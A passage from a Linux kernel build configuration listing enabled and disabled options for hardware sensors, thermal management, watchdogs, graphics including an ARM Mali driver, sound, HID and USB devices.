# CONFIG_SENSORS_LM95241 is not set
# CONFIG_SENSORS_LM95245 is not set
# CONFIG_SENSORS_PC87360 is not set
# CONFIG_SENSORS_PC87427 is not set
# CONFIG_SENSORS_NTC_THERMISTOR is not set
# CONFIG_SENSORS_NCT6683 is not set
# CONFIG_SENSORS_NCT6775 is not set
# CONFIG_SENSORS_NCT7802 is not set
# CONFIG_SENSORS_NCT7904 is not set
# CONFIG_SENSORS_NPCM7XX is not set
# CONFIG_SENSORS_PCF8591 is not set
# CONFIG_PMBUS is not set
# CONFIG_SENSORS_SHT21 is not set
# CONFIG_SENSORS_SHT3x is not set
# CONFIG_SENSORS_SHTC1 is not set
# CONFIG_SENSORS_SIS5595 is not set
# CONFIG_SENSORS_DME1737 is not set
# CONFIG_SENSORS_EMC1403 is not set
# CONFIG_SENSORS_EMC2103 is not set
# CONFIG_SENSORS_EMC6W201 is not set
# CONFIG_SENSORS_SMSC47M1 is not set
# CONFIG_SENSORS_SMSC47M192 is not set
# CONFIG_SENSORS_SMSC47B397 is not set
# CONFIG_SENSORS_SCH5627 is not set
# CONFIG_SENSORS_SCH5636 is not set
# CONFIG_SENSORS_STTS751 is not set
# CONFIG_SENSORS_SMM665 is not set
# CONFIG_SENSORS_ADC128D818 is not set
# CONFIG_SENSORS_ADS1015 is not set
# CONFIG_SENSORS_ADS7828 is not set
# CONFIG_SENSORS_AMC6821 is not set
# CONFIG_SENSORS_INA209 is not set
# CONFIG_SENSORS_INA2XX is not set
# CONFIG_SENSORS_INA3221 is not set
# CONFIG_SENSORS_TC74 is not set
# CONFIG_SENSORS_THMC50 is not set
# CONFIG_SENSORS_TMP102 is not set
# CONFIG_SENSORS_TMP103 is not set
# CONFIG_SENSORS_TMP108 is not set
# CONFIG_SENSORS_TMP401 is not set
# CONFIG_SENSORS_TMP421 is not set
# CONFIG_SENSORS_VIA_CPUTEMP is not set
# CONFIG_SENSORS_VIA686A is not set
# CONFIG_SENSORS_VT1211 is not set
# CONFIG_SENSORS_VT8231 is not set
# CONFIG_SENSORS_W83773G is not set
# CONFIG_SENSORS_W83781D is not set
# CONFIG_SENSORS_W83791D is not set
# CONFIG_SENSORS_W83792D is not set
# CONFIG_SENSORS_W83793 is not set
# CONFIG_SENSORS_W83795 is not set
# CONFIG_SENSORS_W83L785TS is not set
# CONFIG_SENSORS_W83L786NG is not set
# CONFIG_SENSORS_W83627HF is not set
# CONFIG_SENSORS_W83627EHF is not set
# CONFIG_SENSORS_XGENE is not set

#
# ACPI drivers
#
# CONFIG_SENSORS_ACPI_POWER is not set
# CONFIG_SENSORS_ATK0110 is not set
CONFIG_THERMAL=y
# CONFIG_THERMAL_STATISTICS is not set
CONFIG_THERMAL_EMERGENCY_POWEROFF_DELAY_MS=0
CONFIG_THERMAL_HWMON=y
CONFIG_THERMAL_WRITABLE_TRIPS=y
CONFIG_THERMAL_DEFAULT_GOV_STEP_WISE=y
# CONFIG_THERMAL_DEFAULT_GOV_FAIR_SHARE is not set
# CONFIG_THERMAL_DEFAULT_GOV_USER_SPACE is not set
# CONFIG_THERMAL_DEFAULT_GOV_POWER_ALLOCATOR is not set
# CONFIG_THERMAL_GOV_FAIR_SHARE is not set
CONFIG_THERMAL_GOV_STEP_WISE=y
# CONFIG_THERMAL_GOV_BANG_BANG is not set
CONFIG_THERMAL_GOV_USER_SPACE=y
# CONFIG_THERMAL_GOV_POWER_ALLOCATOR is not set
# CONFIG_CLOCK_THERMAL is not set
CONFIG_DEVFREQ_THERMAL=y
# CONFIG_THERMAL_EMULATION is not set
# CONFIG_INTEL_POWERCLAMP is not set
CONFIG_X86_PKG_TEMP_THERMAL=m
# CONFIG_INTEL_SOC_DTS_THERMAL is not set

#
# ACPI INT340X thermal drivers
#
# CONFIG_INT340X_THERMAL is not set
# CONFIG_INTEL_PCH_THERMAL is not set
CONFIG_WATCHDOG=y
# CONFIG_WATCHDOG_CORE is not set
# CONFIG_WATCHDOG_NOWAYOUT is not set
CONFIG_WATCHDOG_HANDLE_BOOT_ENABLED=y
# CONFIG_WATCHDOG_SYSFS is not set

#
# Watchdog Device Drivers
#
# CONFIG_SOFT_WATCHDOG is not set
# CONFIG_WDAT_WDT is not set
# CONFIG_XILINX_WATCHDOG is not set
# CONFIG_ZIIRAVE_WATCHDOG is not set
# CONFIG_CADENCE_WATCHDOG is not set
# CONFIG_DW_WATCHDOG is not set
# CONFIG_MAX63XX_WATCHDOG is not set
# CONFIG_ACQUIRE_WDT is not set
# CONFIG_ADVANTECH_WDT is not set
# CONFIG_ALIM1535_WDT is not set
# CONFIG_ALIM7101_WDT is not set
# CONFIG_EBC_C384_WDT is not set
# CONFIG_F71808E_WDT is not set
# CONFIG_SP5100_TCO is not set
# CONFIG_SBC_FITPC2_WATCHDOG is not set
# CONFIG_EUROTECH_WDT is not set
# CONFIG_IB700_WDT is not set
# CONFIG_IBMASR is not set
# CONFIG_WAFER_WDT is not set
# CONFIG_I6300ESB_WDT is not set
# CONFIG_IE6XX_WDT is not set
# CONFIG_ITCO_WDT is not set
# CONFIG_IT8712F_WDT is not set
# CONFIG_IT87_WDT is not set
# CONFIG_HP_WATCHDOG is not set
# CONFIG_SC1200_WDT is not set
# CONFIG_PC87413_WDT is not set
# CONFIG_NV_TCO is not set
# CONFIG_60XX_WDT is not set
# CONFIG_CPU5_WDT is not set
# CONFIG_SMSC_SCH311X_WDT is not set
# CONFIG_SMSC37B787_WDT is not set
# CONFIG_VIA_WDT is not set
# CONFIG_W83627HF_WDT is not set
# CONFIG_W83877F_WDT is not set
# CONFIG_W83977F_WDT is not set
# CONFIG_MACHZ_WDT is not set
# CONFIG_SBC_EPX_C3_WATCHDOG is not set
# CONFIG_NI903X_WDT is not set
# CONFIG_NIC7018_WDT is not set

#
# PCI-based Watchdog Cards
#
# CONFIG_PCIPCWATCHDOG is not set
# CONFIG_WDTPCI is not set

#
# USB-based Watchdog Cards
#
# CONFIG_USBPCWATCHDOG is not set

#
# Watchdog Pretimeout Governors
#
CONFIG_SSB_POSSIBLE=y
# CONFIG_SSB is not set
CONFIG_BCMA_POSSIBLE=y
# CONFIG_BCMA is not set

#
# Multifunction device drivers
#
# CONFIG_MFD_AS3711 is not set
# CONFIG_PMIC_ADP5520 is not set
# CONFIG_MFD_BCM590XX is not set
# CONFIG_MFD_BD9571MWV is not set
# CONFIG_MFD_AXP20X_I2C is not set
# CONFIG_MFD_CROS_EC is not set
# CONFIG_MFD_MADERA is not set
# CONFIG_PMIC_DA903X is not set
# CONFIG_MFD_DA9052_I2C is not set
# CONFIG_MFD_DA9055 is not set
# CONFIG_MFD_DA9062 is not set
# CONFIG_MFD_DA9063 is not set
# CONFIG_MFD_DA9150 is not set
# CONFIG_MFD_DLN2 is not set
# CONFIG_MFD_MC13XXX_I2C is not set
# CONFIG_HTC_PASIC3 is not set
# CONFIG_MFD_INTEL_QUARK_I2C_GPIO is not set
# CONFIG_LPC_ICH is not set
# CONFIG_LPC_SCH is not set
# CONFIG_MFD_INTEL_LPSS_ACPI is not set
# CONFIG_MFD_INTEL_LPSS_PCI is not set
# CONFIG_MFD_JANZ_CMODIO is not set
# CONFIG_MFD_KEMPLD is not set
# CONFIG_MFD_88PM800 is not set
# CONFIG_MFD_88PM805 is not set
# CONFIG_MFD_88PM860X is not set
# CONFIG_MFD_MAX14577 is not set
# CONFIG_MFD_MAX77693 is not set
# CONFIG_MFD_MAX77843 is not set
# CONFIG_MFD_MAX8907 is not set
# CONFIG_MFD_MAX8925 is not set
# CONFIG_MFD_MAX8997 is not set
# CONFIG_MFD_MAX8998 is not set
# CONFIG_MFD_MT6397 is not set
# CONFIG_MFD_MENF21BMC is not set
# CONFIG_MFD_VIPERBOARD is not set
# CONFIG_MFD_RETU is not set
# CONFIG_MFD_PCF50633 is not set
# CONFIG_MFD_RDC321X is not set
# CONFIG_MFD_RT5033 is not set
# CONFIG_MFD_RC5T583 is not set
# CONFIG_MFD_SEC_CORE is not set
# CONFIG_MFD_SI476X_CORE is not set
# CONFIG_MFD_SM501 is not set
# CONFIG_MFD_SKY81452 is not set
# CONFIG_MFD_SMSC is not set
# CONFIG_ABX500_CORE is not set
# CONFIG_MFD_SYSCON is not set
# CONFIG_MFD_LP3943 is not set
# CONFIG_MFD_LP8788 is not set
# CONFIG_MFD_TI_LMU is not set
# CONFIG_MFD_PALMAS is not set
# CONFIG_TPS6105X is not set
# CONFIG_TPS6507X is not set
# CONFIG_MFD_TPS65086 is not set
# CONFIG_MFD_TPS65090 is not set
# CONFIG_MFD_TI_LP873X is not set
# CONFIG_MFD_TPS6586X is not set
# CONFIG_MFD_TPS65912_I2C is not set
# CONFIG_MFD_TPS80031 is not set
# CONFIG_TWL4030_CORE is not set
# CONFIG_TWL6040_CORE is not set
# CONFIG_MFD_WL1273_CORE is not set
# CONFIG_MFD_LM3533 is not set
# CONFIG_MFD_VX855 is not set
# CONFIG_MFD_ARIZONA_I2C is not set
# CONFIG_MFD_WM8400 is not set
# CONFIG_MFD_WM831X_I2C is not set
# CONFIG_MFD_WM8350_I2C is not set
# CONFIG_MFD_WM8994 is not set
# CONFIG_REGULATOR is not set
# CONFIG_RC_CORE is not set
# CONFIG_MEDIA_SUPPORT is not set

#
# Graphics support
#
CONFIG_AGP=y
CONFIG_AGP_AMD64=y
CONFIG_AGP_INTEL=y
# CONFIG_AGP_SIS is not set
# CONFIG_AGP_VIA is not set
CONFIG_INTEL_GTT=y
CONFIG_VGA_ARB=y
CONFIG_VGA_ARB_MAX_GPUS=16
# CONFIG_VGA_SWITCHEROO is not set
CONFIG_DRM=y
CONFIG_DRM_MIPI_DSI=y
# CONFIG_DRM_DP_AUX_CHARDEV is not set
# CONFIG_DRM_DEBUG_MM is not set
# CONFIG_DRM_DEBUG_SELFTEST is not set
CONFIG_DRM_KMS_HELPER=y
CONFIG_DRM_KMS_FB_HELPER=y
CONFIG_DRM_FBDEV_EMULATION=y
CONFIG_DRM_FBDEV_OVERALLOC=100
# CONFIG_DRM_LOAD_EDID_FIRMWARE is not set
# CONFIG_DRM_DP_CEC is not set

#
# I2C encoder or helper chips
#
# CONFIG_DRM_I2C_CH7006 is not set
# CONFIG_DRM_I2C_SIL164 is not set
# CONFIG_DRM_I2C_NXP_TDA998X is not set
# CONFIG_DRM_I2C_NXP_TDA9950 is not set
# CONFIG_DRM_RADEON is not set
# CONFIG_DRM_AMDGPU is not set

#
# ACP (Audio CoProcessor) Configuration
#

#
# AMD Library routines
#
# CONFIG_DRM_NOUVEAU is not set
CONFIG_DRM_I915=y
# CONFIG_DRM_I915_ALPHA_SUPPORT is not set
CONFIG_DRM_I915_CAPTURE_ERROR=y
CONFIG_DRM_I915_COMPRESS_ERROR=y
CONFIG_DRM_I915_USERPTR=y
# CONFIG_DRM_I915_GVT is not set
# CONFIG_DRM_VGEM is not set
# CONFIG_DRM_VKMS is not set
# CONFIG_DRM_VMWGFX is not set
# CONFIG_DRM_GMA500 is not set
# CONFIG_DRM_UDL is not set
# CONFIG_DRM_AST is not set
# CONFIG_DRM_MGAG200 is not set
# CONFIG_DRM_CIRRUS_QEMU is not set
# CONFIG_DRM_QXL is not set
# CONFIG_DRM_BOCHS is not set
CONFIG_DRM_PANEL=y

#
# Display Panels
#
# CONFIG_DRM_PANEL_RASPBERRYPI_TOUCHSCREEN is not set
CONFIG_DRM_BRIDGE=y
CONFIG_DRM_PANEL_BRIDGE=y

#
# Display Interface Bridges
#
# CONFIG_DRM_ANALOGIX_ANX78XX is not set
# CONFIG_DRM_HISI_HIBMC is not set
# CONFIG_DRM_TINYDRM is not set
# CONFIG_DRM_LEGACY is not set
CONFIG_DRM_PANEL_ORIENTATION_QUIRKS=y

#
# ARM GPU Configuration
#
CONFIG_MALI_MIDGARD=y
CONFIG_MALI_PLATFORM_NAME="vexpress"

#
# Platform specific options
#
CONFIG_MALI_DEVFREQ=y
# CONFIG_MALI_GATOR_SUPPORT is not set
# CONFIG_MALI_MIDGARD_ENABLE_TRACE is not set
# CONFIG_MALI_ARBITER_SUPPORT is not set
# CONFIG_MALI_DMA_BUF_MAP_ON_DEMAND is not set
# CONFIG_MALI_DMA_BUF_LEGACY_COMPAT is not set
CONFIG_MALI_EXPERT=y
# CONFIG_MALI_2MB_ALLOC is not set
# CONFIG_MALI_MEMORY_FULLY_BACKED is not set
# CONFIG_MALI_CORESTACK is not set

#
# Platform options
#
CONFIG_MALI_NO_MALI=y
# CONFIG_MALI_ERROR_INJECT is not set
# CONFIG_MALI_GEM5_BUILD is not set

#
# Debug options
#
CONFIG_MALI_DEBUG=y
CONFIG_MALI_FENCE_DEBUG=y
# CONFIG_MALI_SYSTEM_TRACE is not set

#
# Instrumentation options
#
CONFIG_MALI_PRFCNT_SET_PRIMARY=y
# CONFIG_MALI_PRFCNT_SET_SECONDARY is not set
# CONFIG_MALI_PRFCNT_SET_TERTIARY is not set
# CONFIG_MALI_PRFCNT_SET_SELECT_VIA_DEBUG_FS is not set
# CONFIG_MALI_JOB_DUMP is not set

#
# Workarounds
#
# CONFIG_MALI_PWRSOFT_765 is not set
# CONFIG_MALI_HW_ERRATA_1485982_NOT_AFFECTED is not set
# CONFIG_MALI_HW_ERRATA_1485982_USE_CLOCK_ALTERNATIVE is not set
# CONFIG_MALI_ARBITRATION is not set
# CONFIG_MALI_KUTF is not set

#
# Frame buffer Devices
#
CONFIG_FB_CMDLINE=y
CONFIG_FB_NOTIFY=y
CONFIG_FB=y
# CONFIG_FIRMWARE_EDID is not set
CONFIG_FB_CFB_FILLRECT=y
CONFIG_FB_CFB_COPYAREA=y
CONFIG_FB_CFB_IMAGEBLIT=y
CONFIG_FB_SYS_FILLRECT=y
CONFIG_FB_SYS_COPYAREA=y
CONFIG_FB_SYS_IMAGEBLIT=y
# CONFIG_FB_FOREIGN_ENDIAN is not set
CONFIG_FB_SYS_FOPS=y
CONFIG_FB_DEFERRED_IO=y
CONFIG_FB_MODE_HELPERS=y
CONFIG_FB_TILEBLITTING=y

#
# Frame buffer hardware drivers
#
# CONFIG_FB_CIRRUS is not set
# CONFIG_FB_PM2 is not set
# CONFIG_FB_CYBER2000 is not set
# CONFIG_FB_ARC is not set
# CONFIG_FB_ASILIANT is not set
# CONFIG_FB_IMSTT is not set
# CONFIG_FB_VGA16 is not set
# CONFIG_FB_UVESA is not set
# CONFIG_FB_VESA is not set
CONFIG_FB_EFI=y
# CONFIG_FB_N411 is not set
# CONFIG_FB_HGA is not set
# CONFIG_FB_OPENCORES is not set
# CONFIG_FB_S1D13XXX is not set
# CONFIG_FB_NVIDIA is not set
# CONFIG_FB_RIVA is not set
# CONFIG_FB_I740 is not set
# CONFIG_FB_LE80578 is not set
# CONFIG_FB_MATROX is not set
# CONFIG_FB_RADEON is not set
# CONFIG_FB_ATY128 is not set
# CONFIG_FB_ATY is not set
# CONFIG_FB_S3 is not set
# CONFIG_FB_SAVAGE is not set
# CONFIG_FB_SIS is not set
# CONFIG_FB_NEOMAGIC is not set
# CONFIG_FB_KYRO is not set
# CONFIG_FB_3DFX is not set
# CONFIG_FB_VOODOO1 is not set
# CONFIG_FB_VT8623 is not set
# CONFIG_FB_TRIDENT is not set
# CONFIG_FB_ARK is not set
# CONFIG_FB_PM3 is not set
# CONFIG_FB_CARMINE is not set
# CONFIG_FB_SMSCUFX is not set
# CONFIG_FB_UDL is not set
# CONFIG_FB_IBM_GXT4500 is not set
# CONFIG_FB_VIRTUAL is not set
# CONFIG_FB_METRONOME is not set
# CONFIG_FB_MB862XX is not set
# CONFIG_FB_BROADSHEET is not set
# CONFIG_FB_SIMPLE is not set
# CONFIG_FB_SM712 is not set
CONFIG_BACKLIGHT_LCD_SUPPORT=y
# CONFIG_LCD_CLASS_DEVICE is not set
CONFIG_BACKLIGHT_CLASS_DEVICE=y
CONFIG_BACKLIGHT_GENERIC=y
# CONFIG_BACKLIGHT_APPLE is not set
# CONFIG_BACKLIGHT_PM8941_WLED is not set
# CONFIG_BACKLIGHT_SAHARA is not set
# CONFIG_BACKLIGHT_ADP8860 is not set
# CONFIG_BACKLIGHT_ADP8870 is not set
# CONFIG_BACKLIGHT_LM3639 is not set
# CONFIG_BACKLIGHT_LV5207LP is not set
# CONFIG_BACKLIGHT_BD6107 is not set
# CONFIG_BACKLIGHT_ARCXCNN is not set
CONFIG_HDMI=y

#
# Console display driver support
#
CONFIG_VGA_CONSOLE=y
CONFIG_DUMMY_CONSOLE=y
CONFIG_DUMMY_CONSOLE_COLUMNS=80
CONFIG_DUMMY_CONSOLE_ROWS=25
CONFIG_FRAMEBUFFER_CONSOLE=y
CONFIG_FRAMEBUFFER_CONSOLE_DETECT_PRIMARY=y
# CONFIG_FRAMEBUFFER_CONSOLE_ROTATION is not set
# CONFIG_FRAMEBUFFER_CONSOLE_DEFERRED_TAKEOVER is not set
CONFIG_LOGO=y
# CONFIG_LOGO_LINUX_MONO is not set
# CONFIG_LOGO_LINUX_VGA16 is not set
CONFIG_LOGO_LINUX_CLUT224=y
CONFIG_SOUND=y
CONFIG_SND=y
CONFIG_SND_TIMER=y
CONFIG_SND_PCM=y
CONFIG_SND_HWDEP=y
CONFIG_SND_SEQ_DEVICE=y
CONFIG_SND_JACK=y
CONFIG_SND_JACK_INPUT_DEV=y
# CONFIG_SND_OSSEMUL is not set
CONFIG_SND_PCM_TIMER=y
CONFIG_SND_HRTIMER=y
# CONFIG_SND_DYNAMIC_MINORS is not set
CONFIG_SND_SUPPORT_OLD_API=y
CONFIG_SND_PROC_FS=y
CONFIG_SND_VERBOSE_PROCFS=y
# CONFIG_SND_VERBOSE_PRINTK is not set
# CONFIG_SND_DEBUG is not set
CONFIG_SND_VMASTER=y
CONFIG_SND_DMA_SGBUF=y
CONFIG_SND_SEQUENCER=y
CONFIG_SND_SEQ_DUMMY=y
CONFIG_SND_SEQ_HRTIMER_DEFAULT=y
CONFIG_SND_DRIVERS=y
# CONFIG_SND_PCSP is not set
# CONFIG_SND_DUMMY is not set
# CONFIG_SND_ALOOP is not set
# CONFIG_SND_VIRMIDI is not set
# CONFIG_SND_MTPAV is not set
# CONFIG_SND_SERIAL_U16550 is not set
# CONFIG_SND_MPU401 is not set
CONFIG_SND_PCI=y
# CONFIG_SND_AD1889 is not set
# CONFIG_SND_ALS300 is not set
# CONFIG_SND_ALS4000 is not set
# CONFIG_SND_ALI5451 is not set
# CONFIG_SND_ASIHPI is not set
# CONFIG_SND_ATIIXP is not set
# CONFIG_SND_ATIIXP_MODEM is not set
# CONFIG_SND_AU8810 is not set
# CONFIG_SND_AU8820 is not set
# CONFIG_SND_AU8830 is not set
# CONFIG_SND_AW2 is not set
# CONFIG_SND_AZT3328 is not set
# CONFIG_SND_BT87X is not set
# CONFIG_SND_CA0106 is not set
# CONFIG_SND_CMIPCI is not set
# CONFIG_SND_OXYGEN is not set
# CONFIG_SND_CS4281 is not set
# CONFIG_SND_CS46XX is not set
# CONFIG_SND_CTXFI is not set
# CONFIG_SND_DARLA20 is not set
# CONFIG_SND_GINA20 is not set
# CONFIG_SND_LAYLA20 is not set
# CONFIG_SND_DARLA24 is not set
# CONFIG_SND_GINA24 is not set
# CONFIG_SND_LAYLA24 is not set
# CONFIG_SND_MONA is not set
# CONFIG_SND_MIA is not set
# CONFIG_SND_ECHO3G is not set
# CONFIG_SND_INDIGO is not set
# CONFIG_SND_INDIGOIO is not set
# CONFIG_SND_INDIGODJ is not set
# CONFIG_SND_INDIGOIOX is not set
# CONFIG_SND_INDIGODJX is not set
# CONFIG_SND_EMU10K1 is not set
# CONFIG_SND_EMU10K1X is not set
# CONFIG_SND_ENS1370 is not set
# CONFIG_SND_ENS1371 is not set
# CONFIG_SND_ES1938 is not set
# CONFIG_SND_ES1968 is not set
# CONFIG_SND_FM801 is not set
# CONFIG_SND_HDSP is not set
# CONFIG_SND_HDSPM is not set
# CONFIG_SND_ICE1712 is not set
# CONFIG_SND_ICE1724 is not set
# CONFIG_SND_INTEL8X0 is not set
# CONFIG_SND_INTEL8X0M is not set
# CONFIG_SND_KORG1212 is not set
# CONFIG_SND_LOLA is not set
# CONFIG_SND_LX6464ES is not set
# CONFIG_SND_MAESTRO3 is not set
# CONFIG_SND_MIXART is not set
# CONFIG_SND_NM256 is not set
# CONFIG_SND_PCXHR is not set
# CONFIG_SND_RIPTIDE is not set
# CONFIG_SND_RME32 is not set
# CONFIG_SND_RME96 is not set
# CONFIG_SND_RME9652 is not set
# CONFIG_SND_SE6X is not set
# CONFIG_SND_SONICVIBES is not set
# CONFIG_SND_TRIDENT is not set
# CONFIG_SND_VIA82XX is not set
# CONFIG_SND_VIA82XX_MODEM is not set
# CONFIG_SND_VIRTUOSO is not set
# CONFIG_SND_VX222 is not set
# CONFIG_SND_YMFPCI is not set

#
# HD-Audio
#
CONFIG_SND_HDA=y
CONFIG_SND_HDA_INTEL=y
CONFIG_SND_HDA_HWDEP=y
# CONFIG_SND_HDA_RECONFIG is not set
# CONFIG_SND_HDA_INPUT_BEEP is not set
# CONFIG_SND_HDA_PATCH_LOADER is not set
# CONFIG_SND_HDA_CODEC_REALTEK is not set
# CONFIG_SND_HDA_CODEC_ANALOG is not set
# CONFIG_SND_HDA_CODEC_SIGMATEL is not set
# CONFIG_SND_HDA_CODEC_VIA is not set
# CONFIG_SND_HDA_CODEC_HDMI is not set
# CONFIG_SND_HDA_CODEC_CIRRUS is not set
# CONFIG_SND_HDA_CODEC_CONEXANT is not set
# CONFIG_SND_HDA_CODEC_CA0110 is not set
# CONFIG_SND_HDA_CODEC_CA0132 is not set
# CONFIG_SND_HDA_CODEC_CMEDIA is not set
# CONFIG_SND_HDA_CODEC_SI3054 is not set
# CONFIG_SND_HDA_GENERIC is not set
CONFIG_SND_HDA_POWER_SAVE_DEFAULT=0
CONFIG_SND_HDA_CORE=y
CONFIG_SND_HDA_COMPONENT=y
CONFIG_SND_HDA_I915=y
CONFIG_SND_HDA_PREALLOC_SIZE=64
CONFIG_SND_USB=y
# CONFIG_SND_USB_AUDIO is not set
# CONFIG_SND_USB_UA101 is not set
# CONFIG_SND_USB_USX2Y is not set
# CONFIG_SND_USB_CAIAQ is not set
# CONFIG_SND_USB_US122L is not set
# CONFIG_SND_USB_6FIRE is not set
# CONFIG_SND_USB_HIFACE is not set
# CONFIG_SND_BCD2000 is not set
# CONFIG_SND_USB_POD is not set
# CONFIG_SND_USB_PODHD is not set
# CONFIG_SND_USB_TONEPORT is not set
# CONFIG_SND_USB_VARIAX is not set
CONFIG_SND_PCMCIA=y
# CONFIG_SND_VXPOCKET is not set
# CONFIG_SND_PDAUDIOCF is not set
# CONFIG_SND_SOC is not set
CONFIG_SND_X86=y
# CONFIG_HDMI_LPE_AUDIO is not set

#
# HID support
#
CONFIG_HID=y
# CONFIG_HID_BATTERY_STRENGTH is not set
CONFIG_HIDRAW=y
# CONFIG_UHID is not set
CONFIG_HID_GENERIC=y

#
# Special HID drivers
#
CONFIG_HID_A4TECH=y
# CONFIG_HID_ACCUTOUCH is not set
# CONFIG_HID_ACRUX is not set
CONFIG_HID_APPLE=y
# CONFIG_HID_APPLEIR is not set
# CONFIG_HID_ASUS is not set
# CONFIG_HID_AUREAL is not set
CONFIG_HID_BELKIN=y
# CONFIG_HID_BETOP_FF is not set
CONFIG_HID_CHERRY=y
CONFIG_HID_CHICONY=y
# CONFIG_HID_CORSAIR is not set
# CONFIG_HID_COUGAR is not set
# CONFIG_HID_PRODIKEYS is not set
# CONFIG_HID_CMEDIA is not set
CONFIG_HID_CYPRESS=y
# CONFIG_HID_DRAGONRISE is not set
# CONFIG_HID_EMS_FF is not set
# CONFIG_HID_ELAN is not set
# CONFIG_HID_ELECOM is not set
# CONFIG_HID_ELO is not set
CONFIG_HID_EZKEY=y
# CONFIG_HID_GEMBIRD is not set
# CONFIG_HID_GFRM is not set
# CONFIG_HID_HOLTEK is not set
# CONFIG_HID_GOOGLE_HAMMER is not set
# CONFIG_HID_GT683R is not set
# CONFIG_HID_KEYTOUCH is not set
# CONFIG_HID_KYE is not set
# CONFIG_HID_UCLOGIC is not set
# CONFIG_HID_WALTOP is not set
CONFIG_HID_GYRATION=y
# CONFIG_HID_ICADE is not set
CONFIG_HID_ITE=y
# CONFIG_HID_JABRA is not set
# CONFIG_HID_TWINHAN is not set
CONFIG_HID_KENSINGTON=y
# CONFIG_HID_LCPOWER is not set
# CONFIG_HID_LED is not set
# CONFIG_HID_LENOVO is not set
CONFIG_HID_LOGITECH=y
# CONFIG_HID_LOGITECH_DJ is not set
# CONFIG_HID_LOGITECH_HIDPP is not set
CONFIG_LOGITECH_FF=y
# CONFIG_LOGIRUMBLEPAD2_FF is not set
# CONFIG_LOGIG940_FF is not set
CONFIG_LOGIWHEELS_FF=y
# CONFIG_HID_MAGICMOUSE is not set
# CONFIG_HID_MAYFLASH is not set
CONFIG_HID_REDRAGON=y
CONFIG_HID_MICROSOFT=y
CONFIG_HID_MONTEREY=y
# CONFIG_HID_MULTITOUCH is not set
# CONFIG_HID_NTI is not set
CONFIG_HID_NTRIG=y
# CONFIG_HID_ORTEK is not set
CONFIG_HID_PANTHERLORD=y
CONFIG_PANTHERLORD_FF=y
# CONFIG_HID_PENMOUNT is not set
CONFIG_HID_PETALYNX=y
# CONFIG_HID_PICOLCD is not set
# CONFIG_HID_PLANTRONICS is not set
# CONFIG_HID_PRIMAX is not set
# CONFIG_HID_RETRODE is not set
# CONFIG_HID_ROCCAT is not set
# CONFIG_HID_SAITEK is not set
CONFIG_HID_SAMSUNG=y
CONFIG_HID_SONY=y
# CONFIG_SONY_FF is not set
# CONFIG_HID_SPEEDLINK is not set
# CONFIG_HID_STEAM is not set
# CONFIG_HID_STEELSERIES is not set
CONFIG_HID_SUNPLUS=y
# CONFIG_HID_RMI is not set
# CONFIG_HID_GREENASIA is not set
# CONFIG_HID_SMARTJOYPLUS is not set
# CONFIG_HID_TIVO is not set
CONFIG_HID_TOPSEED=y
# CONFIG_HID_THINGM is not set
# CONFIG_HID_THRUSTMASTER is not set
# CONFIG_HID_UDRAW_PS3 is not set
# CONFIG_HID_WACOM is not set
# CONFIG_HID_WIIMOTE is not set
# CONFIG_HID_XINMO is not set
# CONFIG_HID_ZEROPLUS is not set
# CONFIG_HID_ZYDACRON is not set
# CONFIG_HID_SENSOR_HUB is not set
# CONFIG_HID_ALPS is not set

#
# USB HID support
#
CONFIG_USB_HID=y
CONFIG_HID_PID=y
CONFIG_USB_HIDDEV=y

#
# I2C HID support
#
# CONFIG_I2C_HID is not set

#
# Intel ISH HID support
#
# CONFIG_INTEL_ISH_HID is not set
CONFIG_USB_OHCI_LITTLE_ENDIAN=y
CONFIG_USB_SUPPORT=y
CONFIG_USB_COMMON=y
CONFIG_USB_ARCH_HAS_HCD=y
CONFIG_USB=y
CONFIG_USB_PCI=y
CONFIG_USB_ANNOUNCE_NEW_DEVICES=y

#
# Miscellaneous USB options
#
CONFIG_USB_DEFAULT_PERSIST=y
# CONFIG_USB_DYNAMIC_MINORS is not set
# CONFIG_USB_OTG is not set
# CONFIG_USB_OTG_WHITELIST is not set
# CONFIG_USB_LEDS_TRIGGER_USBPORT is not set
CONFIG_USB_MON=y
# CONFIG_USB_WUSB_CBAF is not set

#
# USB Host Controller Drivers
#
# CONFIG_USB_C67X00_HCD is not set
CONFIG_USB_XHCI_HCD=y
# CONFIG_USB_XHCI_DBGCAP is not set
CONFIG_USB_XHCI_PCI=y
# CONFIG_USB_XHCI_PLATFORM is not set
CONFIG_USB_EHCI_HCD=y
# CONFIG_USB_EHCI_ROOT_HUB_TT is not set
CONFIG_USB_EHCI_TT_NEWSCHED=y
CONFIG_USB_EHCI_PCI=y
# CONFIG_USB_EHCI_HCD_PLATFORM is not set
# CONFIG_USB_OXU210HP_HCD is not set
# CONFIG_USB_ISP116X_HCD is not set
# CONFIG_USB_FOTG210_HCD is not set
CONFIG_USB_OHCI_HCD=y
CONFIG_USB_OHCI_HCD_PCI=y
# CONFIG_USB_OHCI_HCD_PLATFORM is not set
CONFIG_USB_UHCI_HCD=y
# CONFIG_USB_SL811_HCD is not set
# CONFIG_USB_R8A66597_HCD is not set
# CONFIG_USB_HCD_TEST_MODE is not set

#
# USB Device Class drivers
#
# CONFIG_USB_ACM is not set
CONFIG_USB_PRINTER=y
# CONFIG_USB_WDM is not set
# CONFIG_USB_TMC is not set

#
# NOTE: USB_STORAGE depends on SCSI but BLK_DEV_SD may
#

#
# also be needed; see USB_STORAGE Help for more info
#
CONFIG_USB_STORAGE=y
# CONFIG_USB_STORAGE_DEBUG is not set
# CONFIG_USB_STORAGE_REALTEK is not set
# CONFIG_USB_STORAGE_DATAFAB is not set
# CONFIG_USB_STORAGE_FREECOM is not set
# CONFIG_USB_STORAGE_ISD200 is not set
# CONFIG_USB_STORAGE_USBAT is not set
# CONFIG_USB_STORAGE_SDDR09 is not set
# CONFIG_USB_STORAGE_SDDR55 is not set
# CONFIG_USB_STORAGE_JUMPSHOT is not set
# CONFIG_USB_STORAGE_ALAUDA is not set
# CONFIG_USB_STORAGE_ONETOUCH is not set
# CONFIG_USB_STORAGE_KARMA is not set
# CONFIG_USB_STORAGE_CYPRESS_ATACB is not set
# CONFIG_USB_STORAGE_ENE_UB6250 is not set
# CONFIG_USB_UAS is not set

#
# USB Imaging devices
#
# CONFIG_USB_MDC800 is not set
# CONFIG_USB_MICROTEK is not set
# CONFIG_USBIP_CORE is not set
# CONFIG_USB_MUSB_HDRC is not set
# CONFIG_USB_DWC3 is not set
# CONFIG_USB_DWC2 is not set
# CONFIG_USB_CHIPIDEA is not set
# CONFIG_USB_ISP1760 is not set

#
# USB port drivers
#
# CONFIG_USB_SERIAL is not set

#
# USB Miscellaneous drivers
#
# CONFIG_USB_EMI62 is not set
